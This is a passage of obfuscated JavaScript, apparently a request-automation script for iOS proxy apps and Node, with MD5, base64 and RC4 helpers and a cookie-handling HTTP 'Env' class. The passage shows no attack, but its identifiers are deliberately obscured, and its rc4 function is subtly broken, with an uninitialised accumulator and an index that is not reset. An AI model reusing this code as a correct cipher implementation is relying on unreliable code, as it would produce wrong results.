    _0x38bf36 = _0x461a24(_0x38bf36, _0x461a24(_0x461a24(_0x1f3d68(_0x3edef3, _0x224581, _0x3df436), _0x1df9af), _0x5ccf4b));
    return _0x461a24(_0x182440(_0x38bf36, _0x5e8f4e), _0x3edef3);
  }
  function _0x43d845(_0x7ba8de) {
    for (var _0x3b2963, _0x192620 = _0x7ba8de.length, _0x4c3e6c = _0x192620 + 8, _0x5b9013 = (_0x4c3e6c - _0x4c3e6c % 64) / 64, _0x30046d = 16 * (_0x5b9013 + 1), _0x591d29 = new Array(_0x30046d - 1), _0x16e8d4 = 0, _0x1dce93 = 0; _0x192620 > _0x1dce93;) {
      _0x3b2963 = (_0x1dce93 - _0x1dce93 % 4) / 4;
      _0x16e8d4 = _0x1dce93 % 4 * 8;
      _0x591d29[_0x3b2963] = _0x591d29[_0x3b2963] | _0x7ba8de.charCodeAt(_0x1dce93) << _0x16e8d4;
      _0x1dce93++;
    }
    _0x3b2963 = (_0x1dce93 - _0x1dce93 % 4) / 4;
    _0x16e8d4 = _0x1dce93 % 4 * 8;
    _0x591d29[_0x3b2963] = _0x591d29[_0x3b2963] | 128 << _0x16e8d4;
    _0x591d29[_0x30046d - 2] = _0x192620 << 3;
    _0x591d29[_0x30046d - 1] = _0x192620 >>> 29;
    return _0x591d29;
  }
  function _0x20072a(_0x40f588) {
    var _0x4a645d,
      _0x278e8d,
      _0x48aa22 = "",
      _0x5a4d37 = "";
    for (_0x278e8d = 0; 3 >= _0x278e8d; _0x278e8d++) {
      _0x4a645d = _0x40f588 >>> 8 * _0x278e8d & 255;
      _0x5a4d37 = "0" + _0x4a645d.toString(16);
      _0x48aa22 += _0x5a4d37.substr(_0x5a4d37.length - 2, 2);
    }
    return _0x48aa22;
  }
  function _0x1d13c5(_0x143e67) {
    _0x143e67 = _0x143e67.replace(/\r\n/g, "\n");
    for (var _0x1d730c = "", _0x2f124f = 0; _0x2f124f < _0x143e67.length; _0x2f124f++) {
      var _0x3b759b = _0x143e67.charCodeAt(_0x2f124f);
      128 > _0x3b759b ? _0x1d730c += String.fromCharCode(_0x3b759b) : _0x3b759b > 127 && 2048 > _0x3b759b ? (_0x1d730c += String.fromCharCode(_0x3b759b >> 6 | 192), _0x1d730c += String.fromCharCode(63 & _0x3b759b | 128)) : (_0x1d730c += String.fromCharCode(_0x3b759b >> 12 | 224), _0x1d730c += String.fromCharCode(_0x3b759b >> 6 & 63 | 128), _0x1d730c += String.fromCharCode(63 & _0x3b759b | 128));
    }
    return _0x1d730c;
  }
  var _0x588e62,
    _0xc5e22e,
    _0x5ce862,
    _0x56017e,
    _0x2a6746,
    _0x51c534,
    _0x514cf6,
    _0x58ada2,
    _0x31d0b0,
    _0x80b7d0 = [],
    _0x3424de = 7,
    _0x146e53 = 12,
    _0x2ed8ff = 17,
    _0xe984f9 = 22,
    _0x13c7a8 = 5,
    _0x4d1a8b = 9,
    _0x1daae2 = 14,
    _0x10ed80 = 20,
    _0x2b39c5 = 4,
    _0x5ddb98 = 11,
    _0x211ed1 = 16,
    _0x4ab55b = 23,
    _0x5854a8 = 6,
    _0x59fb4d = 10,
    _0x38acc2 = 15,
    _0x35b4ef = 21;
  for (_0x3b7295 = _0x1d13c5(_0x3b7295), _0x80b7d0 = _0x43d845(_0x3b7295), _0x51c534 = 1732584193, _0x514cf6 = 4023233417, _0x58ada2 = 2562383102, _0x31d0b0 = 271733878, _0x588e62 = 0; _0x588e62 < _0x80b7d0.length; _0x588e62 += 16) {
    _0xc5e22e = _0x51c534;
    _0x5ce862 = _0x514cf6;
    _0x56017e = _0x58ada2;
    _0x2a6746 = _0x31d0b0;
    _0x51c534 = _0x28bc75(_0x51c534, _0x514cf6, _0x58ada2, _0x31d0b0, _0x80b7d0[_0x588e62 + 0], _0x3424de, 3614090360);
    _0x31d0b0 = _0x28bc75(_0x31d0b0, _0x51c534, _0x514cf6, _0x58ada2, _0x80b7d0[_0x588e62 + 1], _0x146e53, 3905402710);
    _0x58ada2 = _0x28bc75(_0x58ada2, _0x31d0b0, _0x51c534, _0x514cf6, _0x80b7d0[_0x588e62 + 2], _0x2ed8ff, 606105819);
    _0x514cf6 = _0x28bc75(_0x514cf6, _0x58ada2, _0x31d0b0, _0x51c534, _0x80b7d0[_0x588e62 + 3], _0xe984f9, 3250441966);
    _0x51c534 = _0x28bc75(_0x51c534, _0x514cf6, _0x58ada2, _0x31d0b0, _0x80b7d0[_0x588e62 + 4], _0x3424de, 4118548399);
    _0x31d0b0 = _0x28bc75(_0x31d0b0, _0x51c534, _0x514cf6, _0x58ada2, _0x80b7d0[_0x588e62 + 5], _0x146e53, 1200080426);
    _0x58ada2 = _0x28bc75(_0x58ada2, _0x31d0b0, _0x51c534, _0x514cf6, _0x80b7d0[_0x588e62 + 6], _0x2ed8ff, 2821735955);
    _0x514cf6 = _0x28bc75(_0x514cf6, _0x58ada2, _0x31d0b0, _0x51c534, _0x80b7d0[_0x588e62 + 7], _0xe984f9, 4249261313);
    _0x51c534 = _0x28bc75(_0x51c534, _0x514cf6, _0x58ada2, _0x31d0b0, _0x80b7d0[_0x588e62 + 8], _0x3424de, 1770035416);
    _0x31d0b0 = _0x28bc75(_0x31d0b0, _0x51c534, _0x514cf6, _0x58ada2, _0x80b7d0[_0x588e62 + 9], _0x146e53, 2336552879);
    _0x58ada2 = _0x28bc75(_0x58ada2, _0x31d0b0, _0x51c534, _0x514cf6, _0x80b7d0[_0x588e62 + 10], _0x2ed8ff, 4294925233);
    _0x514cf6 = _0x28bc75(_0x514cf6, _0x58ada2, _0x31d0b0, _0x51c534, _0x80b7d0[_0x588e62 + 11], _0xe984f9, 2304563134);
    _0x51c534 = _0x28bc75(_0x51c534, _0x514cf6, _0x58ada2, _0x31d0b0, _0x80b7d0[_0x588e62 + 12], _0x3424de, 1804603682);
    _0x31d0b0 = _0x28bc75(_0x31d0b0, _0x51c534, _0x514cf6, _0x58ada2, _0x80b7d0[_0x588e62 + 13], _0x146e53, 4254626195);
    _0x58ada2 = _0x28bc75(_0x58ada2, _0x31d0b0, _0x51c534, _0x514cf6, _0x80b7d0[_0x588e62 + 14], _0x2ed8ff, 2792965006);
    _0x514cf6 = _0x28bc75(_0x514cf6, _0x58ada2, _0x31d0b0, _0x51c534, _0x80b7d0[_0x588e62 + 15], _0xe984f9, 1236535329);
    _0x51c534 = _0xb7f9d3(_0x51c534, _0x514cf6, _0x58ada2, _0x31d0b0, _0x80b7d0[_0x588e62 + 1], _0x13c7a8, 4129170786);
    _0x31d0b0 = _0xb7f9d3(_0x31d0b0, _0x51c534, _0x514cf6, _0x58ada2, _0x80b7d0[_0x588e62 + 6], _0x4d1a8b, 3225465664);
    _0x58ada2 = _0xb7f9d3(_0x58ada2, _0x31d0b0, _0x51c534, _0x514cf6, _0x80b7d0[_0x588e62 + 11], _0x1daae2, 643717713);
    _0x514cf6 = _0xb7f9d3(_0x514cf6, _0x58ada2, _0x31d0b0, _0x51c534, _0x80b7d0[_0x588e62 + 0], _0x10ed80, 3921069994);
    _0x51c534 = _0xb7f9d3(_0x51c534, _0x514cf6, _0x58ada2, _0x31d0b0, _0x80b7d0[_0x588e62 + 5], _0x13c7a8, 3593408605);
    _0x31d0b0 = _0xb7f9d3(_0x31d0b0, _0x51c534, _0x514cf6, _0x58ada2, _0x80b7d0[_0x588e62 + 10], _0x4d1a8b, 38016083);
    _0x58ada2 = _0xb7f9d3(_0x58ada2, _0x31d0b0, _0x51c534, _0x514cf6, _0x80b7d0[_0x588e62 + 15], _0x1daae2, 3634488961);
    _0x514cf6 = _0xb7f9d3(_0x514cf6, _0x58ada2, _0x31d0b0, _0x51c534, _0x80b7d0[_0x588e62 + 4], _0x10ed80, 3889429448);
    _0x51c534 = _0xb7f9d3(_0x51c534, _0x514cf6, _0x58ada2, _0x31d0b0, _0x80b7d0[_0x588e62 + 9], _0x13c7a8, 568446438);
    _0x31d0b0 = _0xb7f9d3(_0x31d0b0, _0x51c534, _0x514cf6, _0x58ada2, _0x80b7d0[_0x588e62 + 14], _0x4d1a8b, 3275163606);
    _0x58ada2 = _0xb7f9d3(_0x58ada2, _0x31d0b0, _0x51c534, _0x514cf6, _0x80b7d0[_0x588e62 + 3], _0x1daae2, 4107603335);
    _0x514cf6 = _0xb7f9d3(_0x514cf6, _0x58ada2, _0x31d0b0, _0x51c534, _0x80b7d0[_0x588e62 + 8], _0x10ed80, 1163531501);
    _0x51c534 = _0xb7f9d3(_0x51c534, _0x514cf6, _0x58ada2, _0x31d0b0, _0x80b7d0[_0x588e62 + 13], _0x13c7a8, 2850285829);
    _0x31d0b0 = _0xb7f9d3(_0x31d0b0, _0x51c534, _0x514cf6, _0x58ada2, _0x80b7d0[_0x588e62 + 2], _0x4d1a8b, 4243563512);
    _0x58ada2 = _0xb7f9d3(_0x58ada2, _0x31d0b0, _0x51c534, _0x514cf6, _0x80b7d0[_0x588e62 + 7], _0x1daae2, 1735328473);
    _0x514cf6 = _0xb7f9d3(_0x514cf6, _0x58ada2, _0x31d0b0, _0x51c534, _0x80b7d0[_0x588e62 + 12], _0x10ed80, 2368359562);
    _0x51c534 = _0x5f578c(_0x51c534, _0x514cf6, _0x58ada2, _0x31d0b0, _0x80b7d0[_0x588e62 + 5], _0x2b39c5, 4294588738);
    _0x31d0b0 = _0x5f578c(_0x31d0b0, _0x51c534, _0x514cf6, _0x58ada2, _0x80b7d0[_0x588e62 + 8], _0x5ddb98, 2272392833);
    _0x58ada2 = _0x5f578c(_0x58ada2, _0x31d0b0, _0x51c534, _0x514cf6, _0x80b7d0[_0x588e62 + 11], _0x211ed1, 1839030562);
    _0x514cf6 = _0x5f578c(_0x514cf6, _0x58ada2, _0x31d0b0, _0x51c534, _0x80b7d0[_0x588e62 + 14], _0x4ab55b, 4259657740);
    _0x51c534 = _0x5f578c(_0x51c534, _0x514cf6, _0x58ada2, _0x31d0b0, _0x80b7d0[_0x588e62 + 1], _0x2b39c5, 2763975236);
    _0x31d0b0 = _0x5f578c(_0x31d0b0, _0x51c534, _0x514cf6, _0x58ada2, _0x80b7d0[_0x588e62 + 4], _0x5ddb98, 1272893353);
    _0x58ada2 = _0x5f578c(_0x58ada2, _0x31d0b0, _0x51c534, _0x514cf6, _0x80b7d0[_0x588e62 + 7], _0x211ed1, 4139469664);
    _0x514cf6 = _0x5f578c(_0x514cf6, _0x58ada2, _0x31d0b0, _0x51c534, _0x80b7d0[_0x588e62 + 10], _0x4ab55b, 3200236656);
    _0x51c534 = _0x5f578c(_0x51c534, _0x514cf6, _0x58ada2, _0x31d0b0, _0x80b7d0[_0x588e62 + 13], _0x2b39c5, 681279174);
    _0x31d0b0 = _0x5f578c(_0x31d0b0, _0x51c534, _0x514cf6, _0x58ada2, _0x80b7d0[_0x588e62 + 0], _0x5ddb98, 3936430074);
    _0x58ada2 = _0x5f578c(_0x58ada2, _0x31d0b0, _0x51c534, _0x514cf6, _0x80b7d0[_0x588e62 + 3], _0x211ed1, 3572445317);
    _0x514cf6 = _0x5f578c(_0x514cf6, _0x58ada2, _0x31d0b0, _0x51c534, _0x80b7d0[_0x588e62 + 6], _0x4ab55b, 76029189);
    _0x51c534 = _0x5f578c(_0x51c534, _0x514cf6, _0x58ada2, _0x31d0b0, _0x80b7d0[_0x588e62 + 9], _0x2b39c5, 3654602809);
    _0x31d0b0 = _0x5f578c(_0x31d0b0, _0x51c534, _0x514cf6, _0x58ada2, _0x80b7d0[_0x588e62 + 12], _0x5ddb98, 3873151461);
    _0x58ada2 = _0x5f578c(_0x58ada2, _0x31d0b0, _0x51c534, _0x514cf6, _0x80b7d0[_0x588e62 + 15], _0x211ed1, 530742520);
    _0x514cf6 = _0x5f578c(_0x514cf6, _0x58ada2, _0x31d0b0, _0x51c534, _0x80b7d0[_0x588e62 + 2], _0x4ab55b, 3299628645);
    _0x51c534 = _0x597712(_0x51c534, _0x514cf6, _0x58ada2, _0x31d0b0, _0x80b7d0[_0x588e62 + 0], _0x5854a8, 4096336452);
    _0x31d0b0 = _0x597712(_0x31d0b0, _0x51c534, _0x514cf6, _0x58ada2, _0x80b7d0[_0x588e62 + 7], _0x59fb4d, 1126891415);
    _0x58ada2 = _0x597712(_0x58ada2, _0x31d0b0, _0x51c534, _0x514cf6, _0x80b7d0[_0x588e62 + 14], _0x38acc2, 2878612391);
    _0x514cf6 = _0x597712(_0x514cf6, _0x58ada2, _0x31d0b0, _0x51c534, _0x80b7d0[_0x588e62 + 5], _0x35b4ef, 4237533241);
    _0x51c534 = _0x597712(_0x51c534, _0x514cf6, _0x58ada2, _0x31d0b0, _0x80b7d0[_0x588e62 + 12], _0x5854a8, 1700485571);
    _0x31d0b0 = _0x597712(_0x31d0b0, _0x51c534, _0x514cf6, _0x58ada2, _0x80b7d0[_0x588e62 + 3], _0x59fb4d, 2399980690);
    _0x58ada2 = _0x597712(_0x58ada2, _0x31d0b0, _0x51c534, _0x514cf6, _0x80b7d0[_0x588e62 + 10], _0x38acc2, 4293915773);
    _0x514cf6 = _0x597712(_0x514cf6, _0x58ada2, _0x31d0b0, _0x51c534, _0x80b7d0[_0x588e62 + 1], _0x35b4ef, 2240044497);
    _0x51c534 = _0x597712(_0x51c534, _0x514cf6, _0x58ada2, _0x31d0b0, _0x80b7d0[_0x588e62 + 8], _0x5854a8, 1873313359);
    _0x31d0b0 = _0x597712(_0x31d0b0, _0x51c534, _0x514cf6, _0x58ada2, _0x80b7d0[_0x588e62 + 15], _0x59fb4d, 4264355552);
    _0x58ada2 = _0x597712(_0x58ada2, _0x31d0b0, _0x51c534, _0x514cf6, _0x80b7d0[_0x588e62 + 6], _0x38acc2, 2734768916);
    _0x514cf6 = _0x597712(_0x514cf6, _0x58ada2, _0x31d0b0, _0x51c534, _0x80b7d0[_0x588e62 + 13], _0x35b4ef, 1309151649);
    _0x51c534 = _0x597712(_0x51c534, _0x514cf6, _0x58ada2, _0x31d0b0, _0x80b7d0[_0x588e62 + 4], _0x5854a8, 4149444226);
    _0x31d0b0 = _0x597712(_0x31d0b0, _0x51c534, _0x514cf6, _0x58ada2, _0x80b7d0[_0x588e62 + 11], _0x59fb4d, 3174756917);
    _0x58ada2 = _0x597712(_0x58ada2, _0x31d0b0, _0x51c534, _0x514cf6, _0x80b7d0[_0x588e62 + 2], _0x38acc2, 718787259);
    _0x514cf6 = _0x597712(_0x514cf6, _0x58ada2, _0x31d0b0, _0x51c534, _0x80b7d0[_0x588e62 + 9], _0x35b4ef, 3951481745);
    _0x51c534 = _0x461a24(_0x51c534, _0xc5e22e);
    _0x514cf6 = _0x461a24(_0x514cf6, _0x5ce862);
    _0x58ada2 = _0x461a24(_0x58ada2, _0x56017e);
    _0x31d0b0 = _0x461a24(_0x31d0b0, _0x2a6746);
  }
  var _0xbb0b9 = _0x20072a(_0x51c534) + _0x20072a(_0x514cf6) + _0x20072a(_0x58ada2) + _0x20072a(_0x31d0b0);
  return _0xbb0b9.toLowerCase();
}
function FxPCnMKLw7() {
  _keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
  this.encode = function (_0x44806b) {
    var _0x22ae4d = "",
      _0x171553,
      _0x2bcaf1,
      _0x318557,
      _0x198ad0,
      _0xa3acd1,
      _0x12a86d,
      _0x2801cf,
      _0x27cb47 = 0;
    _0x44806b = _utf8_encode(_0x44806b);
    while (_0x27cb47 < _0x44806b.length) {
      _0x171553 = _0x44806b.charCodeAt(_0x27cb47++);
      _0x2bcaf1 = _0x44806b.charCodeAt(_0x27cb47++);
      _0x318557 = _0x44806b.charCodeAt(_0x27cb47++);
      _0x198ad0 = _0x171553 >> 2;
      _0xa3acd1 = (_0x171553 & 3) << 4 | _0x2bcaf1 >> 4;
      _0x12a86d = (_0x2bcaf1 & 15) << 2 | _0x318557 >> 6;
      _0x2801cf = _0x318557 & 63;
      if (isNaN(_0x2bcaf1)) {
        _0x12a86d = _0x2801cf = 64;
      } else {
        isNaN(_0x318557) && (_0x2801cf = 64);
      }
      _0x22ae4d = _0x22ae4d + _keyStr.charAt(_0x198ad0) + _keyStr.charAt(_0xa3acd1) + _keyStr.charAt(_0x12a86d) + _keyStr.charAt(_0x2801cf);
    }
    return _0x22ae4d;
  };
  this.decode = function (_0x37a447) {
    var _0x218574 = "",
      _0x272234,
      _0x1528b0,
      _0x3965b9,
      _0x34a39a,
      _0x4f3edc,
      _0x240bc3,
      _0x41c6e4,
      _0x36afbb = 0;
    _0x37a447 = _0x37a447.replace(/[^A-Za-z0-9\+\/\=]/g, "");
    while (_0x36afbb < _0x37a447.length) {
      _0x34a39a = _keyStr.indexOf(_0x37a447.charAt(_0x36afbb++));
      _0x4f3edc = _keyStr.indexOf(_0x37a447.charAt(_0x36afbb++));
      _0x240bc3 = _keyStr.indexOf(_0x37a447.charAt(_0x36afbb++));
      _0x41c6e4 = _keyStr.indexOf(_0x37a447.charAt(_0x36afbb++));
      _0x272234 = _0x34a39a << 2 | _0x4f3edc >> 4;
      _0x1528b0 = (_0x4f3edc & 15) << 4 | _0x240bc3 >> 2;
      _0x3965b9 = (_0x240bc3 & 3) << 6 | _0x41c6e4;
      _0x218574 = _0x218574 + String.fromCharCode(_0x272234);
      _0x240bc3 != 64 && (_0x218574 = _0x218574 + String.fromCharCode(_0x1528b0));
      _0x41c6e4 != 64 && (_0x218574 = _0x218574 + String.fromCharCode(_0x3965b9));
    }
    _0x218574 = _utf8_decode(_0x218574);
    return _0x218574;
  };
  _utf8_encode = function (_0x42c644) {
    _0x42c644 = _0x42c644.replace(/\r\n/g, "\n");
    var _0x194a91 = "";
    for (var _0x53856e = 0; _0x53856e < _0x42c644.length; _0x53856e++) {
      var _0x4c84ff = _0x42c644.charCodeAt(_0x53856e);
      if (_0x4c84ff < 128) {
        _0x194a91 += String.fromCharCode(_0x4c84ff);
      } else {
        _0x4c84ff > 127 && _0x4c84ff < 2048 ? (_0x194a91 += String.fromCharCode(_0x4c84ff >> 6 | 192), _0x194a91 += String.fromCharCode(_0x4c84ff & 63 | 128)) : (_0x194a91 += String.fromCharCode(_0x4c84ff >> 12 | 224), _0x194a91 += String.fromCharCode(_0x4c84ff >> 6 & 63 | 128), _0x194a91 += String.fromCharCode(_0x4c84ff & 63 | 128));
      }
    }
    return _0x194a91;
  };
  _utf8_decode = function (_0x313415) {
    c1 = c2 = 0;
    var _0x434ce2 = "",
      _0x164f3f = 0,
      _0x727d12 = c1;
    while (_0x164f3f < _0x313415.length) {
      _0x727d12 = _0x313415.charCodeAt(_0x164f3f);
      if (_0x727d12 < 128) {
        _0x434ce2 += String.fromCharCode(_0x727d12);
        _0x164f3f++;
      } else {
        _0x727d12 > 191 && _0x727d12 < 224 ? (c2 = _0x313415.charCodeAt(_0x164f3f + 1), _0x434ce2 += String.fromCharCode((_0x727d12 & 31) << 6 | c2 & 63), _0x164f3f += 2) : (c2 = _0x313415.charCodeAt(_0x164f3f + 1), c3 = _0x313415.charCodeAt(_0x164f3f + 2), _0x434ce2 += String.fromCharCode((_0x727d12 & 15) << 12 | (c2 & 63) << 6 | c3 & 63), _0x164f3f += 3);
      }
    }
    return _0x434ce2;
  };
}
function rc4(_0x2cfe85, _0x24fde0) {
  var _0x2b9ffc = Array(256),
    _0x3d03f8 = Array(_0x2cfe85.length);
  for (var _0x513674 = 0; _0x513674 < 256; _0x513674++) {
    _0x2b9ffc[_0x513674] = _0x513674;
    var _0x19cb39 = (_0x19cb39 + _0x2b9ffc[_0x513674] + _0x24fde0.charCodeAt(_0x513674 % _0x24fde0.length)) % 256,
      _0x1b2590 = _0x2b9ffc[_0x513674];
    _0x2b9ffc[_0x513674] = _0x2b9ffc[_0x19cb39];
    _0x2b9ffc[_0x19cb39] = _0x1b2590;
  }
  for (var _0x513674 = 0; _0x513674 < _0x2cfe85.length; _0x513674++) {
    _0x3d03f8[_0x513674] = _0x2cfe85.charCodeAt(_0x513674);
  }
  for (var _0x373a4b = 0; _0x373a4b < _0x3d03f8.length; _0x373a4b++) {
    var _0x513674 = (_0x513674 + 1) % 256,
      _0x19cb39 = (_0x19cb39 + _0x2b9ffc[_0x513674]) % 256,
      _0x1b2590 = _0x2b9ffc[_0x513674];
    _0x2b9ffc[_0x513674] = _0x2b9ffc[_0x19cb39];
    _0x2b9ffc[_0x19cb39] = _0x1b2590;
    var _0x877c84 = (_0x2b9ffc[_0x513674] + _0x2b9ffc[_0x19cb39] % 256) % 256;
    _0x3d03f8[_0x373a4b] = String.fromCharCode(_0x3d03f8[_0x373a4b] ^ _0x2b9ffc[_0x877c84]);
  }
  return _0x3d03f8.join("");
}
function Env(t, e) {
  class s {
    constructor(t) {
      this.env = t;
    }
    send(t, e = "GET") {
      t = "string" == typeof t ? {
        url: t
      } : t;
      let s = this.get;
      "POST" === e && (s = this.post);
      return new Promise((e, i) => {
        s.call(this, t, (t, s, r) => {
          t ? i(t) : e(s);
        });
      });
    }
    get(t) {
      return this.send.call(this.env, t);
    }
    post(t) {
      return this.send.call(this.env, t, "POST");
    }
  }
  return new class {
    constructor(t, e) {
      this.name = t;
      this.http = new s(this);
      this.data = null;
      this.dataFile = "box.dat";
      this.logs = [];
      this.isMute = !1;
      this.isNeedRewrite = !1;
      this.logSeparator = "\n";
      this.encoding = "utf-8";
      this.startTime = new Date().getTime();
      Object.assign(this, e);
      this.log("", `🔔${this.name}, 开始!`);
    }
    isNode() {
      return "undefined" != typeof module && !!module.exports;
    }
    isQuanX() {
      return "undefined" != typeof $task;
    }
    isSurge() {
      return "undefined" != typeof $httpClient && "undefined" == typeof $loon;
    }
    isLoon() {
      return "undefined" != typeof $loon;
    }
    isShadowrocket() {
      return "undefined" != typeof $rocket;
    }
    toObj(t, e = null) {
      try {
        return JSON.parse(t);
      } catch {
        return e;
      }
    }
    toStr(t, e = null) {
      try {
        return JSON.stringify(t);
      } catch {
        return e;
      }
    }
    getjson(t, e) {
      let s = e;
      const i = this.getdata(t);
      if (i) {
        try {
          s = JSON.parse(this.getdata(t));
        } catch {}
      }
      return s;
    }
    setjson(t, e) {
      try {
        return this.setdata(JSON.stringify(t), e);
      } catch {
        return !1;
      }
    }
    getScript(t) {
      return new Promise(e => {
        this.get({
          url: t
        }, (t, s, i) => e(i));
      });
    }
    runScript(t, e) {
      return new Promise(s => {
        let i = this.getdata("@chavy_boxjs_userCfgs.httpapi");
        i = i ? i.replace(/\n/g, "").trim() : i;
        let r = this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");
        r = r ? 1 * r : 20;
        r = e && e.timeout ? e.timeout : r;
        const [o, h] = i.split("@"),
          n = {
            url: `http://${h}/v1/scripting/evaluate`,
            body: {
              script_text: t,
              mock_type: "cron",
              timeout: r
            },
            headers: {
              "X-Key": o,
              Accept: "*/*"
            }
          };
        this.post(n, (t, e, i) => s(i));
      }).catch(t => this.logErr(t));
    }
    loaddata() {
      if (!this.isNode()) {
        return {};
      }
      {
        this.fs = this.fs ? this.fs : require("fs");
        this.path = this.path ? this.path : require("path");
        const t = this.path.resolve(this.dataFile),
          e = this.path.resolve(process.cwd(), this.dataFile),
          s = this.fs.existsSync(t),
          i = !s && this.fs.existsSync(e);
        if (!s && !i) {
          return {};
        }
        {
          const i = s ? t : e;
          try {
            return JSON.parse(this.fs.readFileSync(i));
          } catch (t) {
            return {};
          }
        }
      }
    }
    writedata() {
      if (this.isNode()) {
        this.fs = this.fs ? this.fs : require("fs");
        this.path = this.path ? this.path : require("path");
        const t = this.path.resolve(this.dataFile),
          e = this.path.resolve(process.cwd(), this.dataFile),
          s = this.fs.existsSync(t),
          i = !s && this.fs.existsSync(e),
          r = JSON.stringify(this.data);
        s ? this.fs.writeFileSync(t, r) : i ? this.fs.writeFileSync(e, r) : this.fs.writeFileSync(t, r);
      }
    }
    lodash_get(t, e, s) {
      const i = e.replace(/\[(\d+)\]/g, ".$1").split(".");
      let r = t;
      for (const t of i) if (r = Object(r)[t], void 0 === r) {
        return s;
      }
      return r;
    }
    lodash_set(t, e, s) {
      return Object(t) !== t ? t : (Array.isArray(e) || (e = e.toString().match(/[^.[\]]+/g) || []), e.slice(0, -1).reduce((t, s, i) => Object(t[s]) === t[s] ? t[s] : t[s] = Math.abs(e[i + 1]) >> 0 == +e[i + 1] ? [] : {}, t)[e[e.length - 1]] = s, t);
    }
    getdata(t) {
      let e = this.getval(t);
      if (/^@/.test(t)) {
        const [, s, i] = /^@(.*?)\.(.*?)$/.exec(t),
          r = s ? this.getval(s) : "";
        if (r) {
          try {
            const t = JSON.parse(r);
            e = t ? this.lodash_get(t, i, "") : e;
          } catch (t) {
            e = "";
          }
        }
      }
      return e;
    }
    setdata(t, e) {
      let s = !1;
      if (/^@/.test(e)) {
        const [, i, r] = /^@(.*?)\.(.*?)$/.exec(e),
          o = this.getval(i),
          h = i ? "null" === o ? null : o || "{}" : "{}";
        try {
          const e = JSON.parse(h);
          this.lodash_set(e, r, t);
          s = this.setval(JSON.stringify(e), i);
        } catch (e) {
          const o = {};
          this.lodash_set(o, r, t);
          s = this.setval(JSON.stringify(o), i);
        }
      } else {
        s = this.setval(t, e);
      }
      return s;
    }
    getval(t) {
      return this.isSurge() || this.isLoon() ? $persistentStore.read(t) : this.isQuanX() ? $prefs.valueForKey(t) : this.isNode() ? (this.data = this.loaddata(), this.data[t]) : this.data && this.data[t] || null;
    }
    setval(t, e) {
      return this.isSurge() || this.isLoon() ? $persistentStore.write(t, e) : this.isQuanX() ? $prefs.setValueForKey(t, e) : this.isNode() ? (this.data = this.loaddata(), this.data[e] = t, this.writedata(), !0) : this.data && this.data[e] || null;
    }
    initGotEnv(t) {
      this.got = this.got ? this.got : require("got");
      this.cktough = this.cktough ? this.cktough : require("tough-cookie");
      this.ckjar = this.ckjar ? this.ckjar : new this.cktough.CookieJar();
      t && (t.headers = t.headers ? t.headers : {}, void 0 === t.headers.Cookie && void 0 === t.cookieJar && (t.cookieJar = this.ckjar));
    }
    get(t, e = () => {}) {
      if (t.headers && (delete t.headers["Content-Type"], delete t.headers["Content-Length"]), this.isSurge() || this.isLoon()) {
        this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, {
          "X-Surge-Skip-Scripting": !1
        }));
        $httpClient.get(t, (t, s, i) => {
          !t && s && (s.body = i, s.statusCode = s.status);
          e(t, s, i);
        });
      } else {
        if (this.isQuanX()) {
          this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {
            hints: !1
          }));
          $task.fetch(t).then(t => {
            const {
              statusCode: s,
              statusCode: i,
              headers: r,
              body: o
            } = t;
            e(null, {
              status: s,
              statusCode: i,
              headers: r,
              body: o
            }, o);
          }, t => e(t));
        } else {
          if (this.isNode()) {
            let s = require("iconv-lite");
            this.initGotEnv(t);
            this.got(t).on("redirect", (t, e) => {
              try {
                if (t.headers["set-cookie"]) {
                  const s = t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();
                  s && this.ckjar.setCookieSync(s, null);
                  e.cookieJar = this.ckjar;
                }
              } catch (t) {
                this.logErr(t);
              }
            }).then(t => {
              const {
                statusCode: i,
                statusCode: r,
                headers: o,
                rawBody: h
              } = t;
              e(null, {
                status: i,
                statusCode: r,
                headers: o,
                rawBody: h
              }, s.decode(h, this.encoding));
            }, t => {
              const {
                message: i,
                response: r
              } = t;
              e(i, r, r && s.decode(r.rawBody, this.encoding));
            });
          }
        }
      }
    }
    post(t, e = () => {}) {
      const s = t.method ? t.method.toLocaleLowerCase() : "post";
      if (t.body && t.headers && !t.headers["Content-Type"] && (t.headers["Content-Type"] = "application/x-www-form-urlencoded"), t.headers && delete t.headers["Content-Length"], this.isSurge() || this.isLoon()) {
        this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, {
          "X-Surge-Skip-Scripting": !1
        }));
        $httpClient[s](t, (t, s, i) => {
          !t && s && (s.body = i, s.statusCode = s.status);
          e(t, s, i);
        });
      } else {
        if (this.isQuanX()) {
          t.method = s;
          this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {
            hints: !1
          }));
          $task.fetch(t).then(t => {
            const {
              statusCode: s,
              statusCode: i,
              headers: r,
              body: o
            } = t;
            e(null, {
              status: s,
              statusCode: i,
              headers: r,
              body: o
            }, o);
          }, t => e(t));
        } else {
          if (this.isNode()) {
            let i = require("iconv-lite");
            this.initGotEnv(t);
            const {
              url: r,
              ...o
            } = t;
            this.got[s](r, o).then(t => {
              const {
                statusCode: s,
                statusCode: r,
                headers: o,
                rawBody: h
              } = t;
              e(null, {
                status: s,
                statusCode: r,
                headers: o,
                rawBody: h
              }, i.decode(h, this.encoding));
            }, t => {
              const {
                message: s,
                response: r
              } = t;
              e(s, r, r && i.decode(r.rawBody, this.encoding));
            });
          }
        }
      }
    }
    time(t, e = null) {
      const s = e ? new Date(e) : new Date();
      let i = {
        "M+": s.getMonth() + 1,
        "d+": s.getDate(),
        "H+": s.getHours(),
        "m+": s.getMinutes(),
        "s+": s.getSeconds(),
        "q+": Math.floor((s.getMonth() + 3) / 3),
        S: s.getMilliseconds()
      };
      /(y+)/.test(t) && (t = t.replace(RegExp.$1, (s.getFullYear() + "").substr(4 - RegExp.$1.length)));
      for (let e in i) new RegExp("(" + e + ")").test(t) && (t = t.replace(RegExp.$1, 1 == RegExp.$1.length ? i[e] : ("00" + i[e]).substr(("" + i[e]).length)));
      return t;
    }
    msg(e = t, s = "", i = "", r) {
      const o = t => {
        if (!t) {
          return t;
        }
        if ("string" == typeof t) {
          return this.isLoon() ? t : this.isQuanX() ? {
            "open-url": t
          } : this.isSurge() ? {
            url: t
          } : void 0;
        }
        if ("object" == typeof t) {
          if (this.isLoon()) {
            let e = t.openUrl || t.url || t["open-url"],
